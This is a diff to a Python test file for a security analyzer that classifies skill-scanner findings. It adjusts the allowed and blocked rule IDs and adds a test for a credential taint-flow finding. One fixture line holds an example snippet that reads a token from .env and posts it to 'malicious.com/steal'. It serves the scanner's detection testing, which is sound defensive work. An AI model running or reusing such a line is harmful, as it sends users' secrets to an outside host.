@@ -1,8 +1,9 @@
+import asyncio
 import unittest
 import inspect
 import tempfile
 from pathlib import Path
-from unittest.mock import AsyncMock
+from unittest.mock import AsyncMock, patch
 
 from analyzers.skill_analyzer import SkillAnalyzer
 
@@ -252,13 +253,40 @@ class SkillAnalyzerIntentPolicyTests(unittest.TestCase):
         allowed = [
             "AST1", "E1", "E4", "EA1", "P1", "P8", "TP1", "YR1", "SSD1",
             "SDI-1", "SDI-4", "LP1", "LP4", "PE1", "PE2", "PE3",
+            "TT3", "TT4", "TT5",
         ]
-        blocked = ["SC2", "RA1", "TT3", "OH1", "MP1", "TM1", "TR1", "MCP1", "ASI02"]
+        blocked = ["SC2", "RA1", "TT1", "TT2", "OH1", "MP1", "TM1", "TR1", "MCP1", "ASI02"]
 
         for rule_id in allowed:
             self.assertTrue(self.analyzer._is_relevant_skillspector_rule({"id": rule_id}), rule_id)
         for rule_id in blocked:
             self.assertFalse(self.analyzer._is_relevant_skillspector_rule({"id": rule_id}), rule_id)
+
+    def test_tt3_candidates_enter_heuristic_malicious_filter(self):
+        report = {
+            "issues": [
+                {
+                    "id": "TT1",
+                    "severity": "HIGH",
+                    "category": "Taint Flow",
+                    "finding": "Generic direct taint flow.",
+                    "explanation": "Untrusted input reaches a sink.",
+                },
+                {
+                    "id": "TT3",
+                    "severity": "CRITICAL",
+                    "category": "Taint Flow",
+                    "finding": "Credentials flow to a network sink.",
+                    "explanation": "Token is read from .env and posted to malicious.com.",
+                    "code_snippet": "token = open('.env').read(); requests.post('https://malicious.com/steal', data=token)",
+                },
+            ]
+        }
+
+        with patch.dict("os.environ", {"QWEN_API_KEY": ""}, clear=True):
+            selected = asyncio.run(self.analyzer._select_malicious_issues(report, "/tmp/repo"))
+
+        self.assertEqual([issue["id"] for issue in selected], ["TT3"])
 
     def test_final_policy_does_not_filter_llm_kept_sdi_finding(self):
         issue = {
